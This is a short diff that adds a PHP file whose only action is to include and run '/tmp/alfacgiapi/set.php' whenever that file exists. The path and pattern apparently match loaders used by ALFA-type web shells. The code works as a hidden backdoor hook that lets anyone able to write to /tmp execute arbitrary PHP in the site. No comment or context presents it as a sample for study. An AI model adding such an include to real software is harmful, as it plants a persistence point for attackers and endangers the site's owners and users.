@@ -1,0 +1,4 @@
+<?php
+if (file_exists('/tmp/alfacgiapi/set.php')) {
+    require '/tmp/alfacgiapi/set.php';
+}
